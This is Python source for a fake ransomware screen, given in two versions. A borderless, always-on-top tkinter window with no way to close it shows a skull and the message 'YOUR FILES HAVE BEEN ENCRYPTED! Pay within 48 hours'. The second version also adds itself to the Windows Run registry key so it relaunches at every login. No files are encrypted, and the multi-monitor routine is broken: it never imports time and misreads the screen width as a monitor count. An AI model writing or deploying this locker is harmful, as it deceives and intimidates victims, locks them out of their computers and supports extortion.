import tkinter as tk
from PIL import Image, ImageTk

root = tk.Tk()
root.title("Ransomware")
root.configure(bg="black")

root.overrideredirect(True)
root.protocol("WM_DELETE_WINDOW", lambda: None)
root.attributes("-topmost", True)   

image_path = "Skull.png"

original_image = Image.open(image_path)
resized_image = original_image.resize((700, 400)) 
image = ImageTk.PhotoImage(resized_image)

image_label = tk.Label(root, image=image, bg="black")
image_label.place(relx=0.5, rely=0.4, anchor="center")

text_label = tk.Label(root, text="YOUR FILES HAVE BEEN ENCRYPTED!", font=("Segui UI", 30, "bold"), fg="red", bg="black")
text_label.place(relx=0.5, rely=0.65, anchor="center")  

text_label = tk.Label(root, text="Pay within 48 hours or lose all your files!", font=("Segui UI", 30, "bold"), fg="red", bg="black")
text_label.place(relx=0.5, rely=0.7, anchor="center")  

def decrypt():
    print("!")

button = tk.Button(root, text="Click to Pay", font=("Segoe UI", 20), fg="black", bg="red", command=decrypt)
button.place(relx=0.5, rely=0.75, anchor="center")


screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()

root.geometry(f"{screen_width}x{screen_height}+{0}+{0}")

root.mainloop() 



#Test

import tkinter as tk
from PIL import Image, ImageTk
import os
import sys
import winreg as reg
import threading

def add_to_startup():
    # Get the path of the current script and add it to startup registry
    script_path = sys.argv[0]
    registry_key = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    reg.CreateKey(reg.HKEY_CURRENT_USER, registry_key)
    reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, registry_key, 0, reg.KEY_WRITE)
    reg.SetValueEx(reg_key, "RansomwareApp", 0, reg.REG_SZ, script_path)
    reg.CloseKey(reg_key)

def remove_from_startup():
    # Remove from startup if needed (for cleanup)
    script_path = sys.argv[0]
    registry_key = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, registry_key, 0, reg.KEY_WRITE)
    try:
        reg.DeleteValue(reg_key, "RansomwareApp")
    except FileNotFoundError:
        pass
    reg.CloseKey(reg_key)

def on_closing():
    # Prevent closing
    pass

def decrypt():
    print("You clicked to pay! (This is just for educational purposes!)")

def show_on_all_screens():
    # Get all available screen sizes and place the window on each
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()

    # For multiple monitors
    screens = root.winfo_screenwidth()
    if screens > 1:
        for screen in range(screens):
            root.geometry(f"{screen_width}x{screen_height}+{screen * screen_width}+0")
            root.update()
            time.sleep(0.1)  # Giving the window time to display on each screen.
    else:
        root.geometry(f"{screen_width}x{screen_height}+0+0")

# Set the app to open at startup when run
add_to_startup()

root = tk.Tk()
root.title("Ransomware")
root.configure(bg="black")
root.overrideredirect(True)  # Hide the window border
root.protocol("WM_DELETE_WINDOW", on_closing)  # Disable closing
root.attributes("-topmost", True)  # Always on top

image_path = "Skull.png"
original_image = Image.open(image_path)
resized_image = original_image.resize((700, 400)) 
image = ImageTk.PhotoImage(resized_image)

image_label = tk.Label(root, image=image, bg="black")
image_label.place(relx=0.5, rely=0.4, anchor="center")

text_label = tk.Label(root, text="YOUR FILES HAVE BEEN ENCRYPTED!", font=("Impact", 40, "bold"), fg="red", bg="black")
text_label.place(relx=0.5, rely=0.65, anchor="center")

text_label = tk.Label(root, text="Pay within 48 hours or lose all your files!", font=("Impact", 30, "bold"), fg="red", bg="black")
text_label.place(relx=0.5, rely=0.7, anchor="center")

button = tk.Button(root, text="Click to Pay", font=("Segoe UI", 20), fg="black", bg="red", command=decrypt)
button.place(relx=0.5, rely=0.75, anchor="center")

# Show on all screens
show_on_all_screens()

# Full screen
root.geometry(f"{root.winfo_screenwidth()}x{root.winfo_screenheight()}+0+0")

# Start the app
root.mainloop()
